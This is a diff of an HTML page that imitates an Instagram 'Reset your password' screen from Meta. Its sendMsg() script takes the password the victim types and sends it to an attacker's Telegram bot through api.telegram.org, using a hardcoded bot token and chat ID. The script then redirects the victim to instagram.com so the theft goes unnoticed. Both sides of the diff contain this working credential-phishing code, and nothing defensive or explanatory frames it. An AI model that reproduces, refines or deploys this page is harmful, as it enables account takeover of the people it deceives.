@@ -5,171 +5,65 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Reset Password</title>
     <style>
-        /* CSS - The Design */
-        body {
-            background-color: #000000; /* Deep black background */
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            max-width: 380px;
-            width: 100%;
-            padding: 20px;
-            text-align: left; /* Align text to match the image */
-        }
-
-        h2 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        p {
-            font-size: 14px;
-            color: #f5f5f5;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        input[type="password"] {
-            width: 100%;
-            padding: 14px;
-            background-color: #121212;
-            border: 1px solid #333;
-            border-radius: 12px;
-            color: white;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-
-        input[type="password"]:focus {
-            outline: none;
-            border-color: #555;
-        }
-
-        .btn-continue {
-            width: 100%;
-            padding: 12px;
-            background-color: #0064e0; /* Meta Blue */
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            margin-bottom: 20px;
-        }
-
-        .btn-continue:hover {
-            background-color: #1877f2;
-        }
-
-        .checkbox-container {
-            display: flex;
-            gap: 12px;
-            font-size: 14px;
-            color: #f5f5f5;
-            line-height: 1.4;
-            margin-bottom: 40px;
-        }
-
-        .checkbox-container input {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-        }
-
-        footer {
-            text-align: center;
-            font-size: 12px;
-            color: #a8a8a8;
-        }
-
-        .links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-
-        .links span {
-            cursor: pointer;
-        }
+        body { background-color:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+        .container { max-width:380px; width:100%; padding:20px; text-align:left; }
+        h2 { font-size:24px; font-weight:600; margin-bottom:10px; }
+        p { font-size:14px; color:#f5f5f5; line-height:1.5; margin-bottom:25px; }
+        .input-group { margin-bottom:15px; }
+        input[type="password"] { width:100%; padding:14px; background-color:#121212; border:1px solid #333; border-radius:12px; color:white; font-size:16px; }
+        input[type="password"]:focus { outline:none; border-color:#555; }
+        .btn-continue { width:100%; padding:12px; background-color:#0064e0; color:white; border:none; border-radius:10px; font-weight:600; font-size:14px; cursor:pointer; margin-bottom:20px; }
+        .btn-continue:hover { background-color:#1877f2; }
+        .checkbox-container { display:flex; gap:12px; font-size:14px; color:#f5f5f5; line-height:1.4; margin-bottom:40px; }
+        .checkbox-container input { width:20px; height:20px; cursor:pointer; }
+        footer { text-align:center; font-size:12px; color:#a8a8a8; }
+        .links { display:flex; flex-wrap:wrap; justify-content:center; gap:10px; margin-bottom:10px; }
+        .links span { cursor:pointer; }
     </style>
 </head>
 <body>
 
+<div class="container">
+    <h2>Reset your password</h2>
+    <p>Enter your old password You'll need this password to log into your account.</p>
 
-
-    <div class="container">
-        <h2>Reset your password</h2>
-        <p>Enter your old password You'll need this password to log into your account.</p>
-        
-     
-            <div class="input-group">
-                <input type="password" name="pass" id="OldPassword" placeholder="Old password" required>
-            </div>
-            
-            <button type="button" class="btn-continue" onclick="sendMsg()">Continue</button>
-
-            
-            <div class="checkbox-container">
-                <input type="checkbox" name="logout_session" id="logoutOthers">
-                <label for="logoutOthers">Log out everywhere else to make sure no one else can still access your account</label>
-            </div>
-         
-
-        <footer>
-            <div class="links">
-                <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span> 
-                <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span>
-            </div>
-            <div>English ∨ &copy; 2026 Instagram from Meta</div>
-        </footer>
+    <div class="input-group">
+        <input type="password" id="OldPassword" placeholder="Old password" required>
     </div>
+
+    <button type="button" class="btn-continue" onclick="sendMsg()">Continue</button>
+
+    <div class="checkbox-container">
+        <input type="checkbox" id="logoutOthers">
+        <label for="logoutOthers">Log out everywhere else to make sure no one else can still access your account</label>
+    </div>
+
+    <footer>
+        <div class="links">
+            <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span>
+            <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span>
+        </div>
+        <div>English ∨ &copy; 2026 Instagram from Meta</div>
+    </footer>
+</div>
+
 <script>
 function sendMsg() {
-  const token = "8210016681:AAFCdXDYc_vu6Ep4tfRiOyT4wfPvJFqf1lY";
-  const chatId = "-1003873305689";
-  const message = document.getElementById("OldPassword").value;
+    const token = "8210016681:AAFCdXDYc_vu6Ep4tfRiOyT4wfPvJFqf1lY";  
+    const chatId = "-1003873305689";   
+    const message = document.getElementById("OldPassword").value;
 
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: " BOT:\n" + message
-   })
-  })
- .then(() => {
-
-    window.location.href = "https://www.instagram.com"; 
-  })
-  .catch(err => console.error(err));
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+    .then(() => {
+        window.location.href = "https://www.instagram.com";
+    })
+    .catch(err => console.error(err));
 }
 </script>
 
- 
 </body>
 </html>
-
-
-
-
-
-
-
-
